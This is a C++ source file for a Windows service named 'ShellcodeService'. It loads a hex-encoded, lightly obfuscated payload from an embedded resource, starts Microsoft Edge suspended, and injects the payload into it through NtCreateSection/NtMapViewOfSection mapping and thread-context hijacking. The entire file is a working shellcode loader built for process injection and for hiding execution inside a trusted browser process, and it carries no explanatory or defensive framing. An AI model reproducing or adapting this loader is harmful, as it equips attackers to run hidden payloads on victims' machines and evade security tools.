#include <Windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <tchar.h>
#include <winternl.h>
#include <winnt.h>
#include <string>

#include "Native.h"
#include "resource.h"

#pragma comment(lib, "winhttp.lib")

WCHAR SERVICE_NAME[] = L"ShellcodeService";
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

// Service Function
void ServiceMain(int argc, char* argv[]);

// Control Function of service
void ControlHandler(DWORD request);

// Logs 
void LogEvent(const char* message, WORD type);

int main()
{
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        LogEvent("Failed to start service control dispatcher.", EVENTLOG_ERROR_TYPE);
    }

    return 0;
}



std::string resource()
{
    HRSRC hRsrc = NULL;
    hRsrc = FindResource(
        NULL,
        MAKEINTRESOURCE(IDR_RCDATA1),
        RT_RCDATA);

    HGLOBAL hGlobal = NULL;
    hGlobal = LoadResource(NULL, hRsrc);

    PVOID ptr = NULL;
    ptr = LockResource(hGlobal);

    SIZE_T size = NULL;
    size = SizeofResource(NULL, hRsrc);

    std::string result(reinterpret_cast<const char*>(ptr), size);
    return result;
}

// decode
std::vector<BYTE> decode(const std::string& hex) {
    std::vector<BYTE> shellcode;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string hex_byte = hex.substr(i, 2);

        for (char& c : hex_byte)
            if (c >= 'g' && c <= 'p')
                c = '0' + (c - 'g');

        BYTE byte = std::stoi(hex_byte, nullptr, 16);
        shellcode.push_back(byte);
    }
    return shellcode;
}
void InjectShellcode() {
        std::string hex = resource();
        std::vector<BYTE> shellcode = decode(hex);

        // create startup info struct
        LPSTARTUPINFOW startup_info = new STARTUPINFOW();
        startup_info->cb = sizeof(STARTUPINFOW);
        startup_info->dwFlags = STARTF_USESHOWWINDOW;

        // create process info struct
        PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

        // null terminated command line
        wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";

        // create process
        CreateProcess(
            NULL,
            cmd,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED,
            NULL,
            NULL,
            startup_info,
            process_info);

        HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
        NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
        NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
        NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");


        // create section in local process
        HANDLE hSection;
        LARGE_INTEGER szSection = { shellcode.size() };

        NTSTATUS status = ntCreateSection(
            &hSection,
            SECTION_ALL_ACCESS,
            NULL,
            &szSection,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            NULL);

        // map section into memory of local process
        PVOID hLocalAddress = NULL;
        SIZE_T viewSize = 0;

        status = ntMapViewOfSection(
            hSection,
            GetCurrentProcess(),
            &hLocalAddress,
            NULL,
            NULL,
            NULL,
            &viewSize,
            ViewShare,
            NULL,
            PAGE_EXECUTE_READWRITE);

        // copy shellcode into local memory
        RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

        // map section into memory of remote process
        PVOID hRemoteAddress = NULL;

        status = ntMapViewOfSection(
            hSection,
            process_info->hProcess,
            &hRemoteAddress,
            NULL,
            NULL,
            NULL,
            &viewSize,
            ViewShare,
            NULL,
            PAGE_EXECUTE_READWRITE);

        // get context of main thread
        LPCONTEXT pContext = new CONTEXT();
        pContext->ContextFlags = CONTEXT_INTEGER;
        GetThreadContext(process_info->hThread, pContext);

        // update rcx context
        pContext->Rcx = (DWORD64)hRemoteAddress;
        SetThreadContext(process_info->hThread, pContext);

        // resume thread
        ResumeThread(process_info->hThread);

        // unmap memory from local process
        status = ntUnmapViewOfSection(
            GetCurrentProcess(),
            hLocalAddress);
    
}


void ServiceMain(int argc, char* argv[]) {
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)NULL) {
        LogEvent("Failed to register service control handler.", EVENTLOG_ERROR_TYPE);
        return;
    }

    // service as running 
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(hStatus, &ServiceStatus);

    LogEvent("Service is starting...", EVENTLOG_INFORMATION_TYPE);

    // Running state
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    LogEvent("Service is now running.", EVENTLOG_INFORMATION_TYPE);

    try {

        // Injection
        InjectShellcode();

        LogEvent("Shellcode injected successfully.", EVENTLOG_INFORMATION_TYPE);
    }
    catch (...) {
        LogEvent("An error occurred during shellcode injection.", EVENTLOG_ERROR_TYPE);
    }

    // for maintaining the service up
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        Sleep(1000);
    }

    // stopping 
    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
    LogEvent("Service has stopped.", EVENTLOG_INFORMATION_TYPE);

    // Maintenir le service actif
    //while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
     //   Sleep(1000);
    //}
}

void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        LogEvent("Service stop requested.", EVENTLOG_INFORMATION_TYPE);
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hStatus, &ServiceStatus);

        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        break;
    default:
        break;
    }
}


void LogEvent(const char* message, WORD type) {
    HANDLE hEventSource = RegisterEventSource(NULL, SERVICE_NAME);
    if (hEventSource) {
        ReportEvent(hEventSource, type, 0, 0, NULL, 1, 0, 0, NULL);
        DeregisterEventSource(hEventSource);
    }
}
